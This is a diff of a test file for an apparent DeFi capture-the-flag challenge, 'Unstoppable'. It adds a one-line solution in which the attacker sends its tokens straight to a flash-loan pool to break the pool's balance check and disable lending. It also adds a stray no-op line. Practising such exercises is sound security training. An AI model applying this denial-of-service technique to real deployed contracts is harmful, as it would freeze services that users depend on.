@@ -7,6 +7,7 @@ describe('[Challenge] Unstoppable', function () {
     // Pool has 1M * 10**18 tokens
     const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
     const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');
+    ethers.utils.parseEther
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
@@ -40,6 +41,7 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
     });
 
     after(async function () {
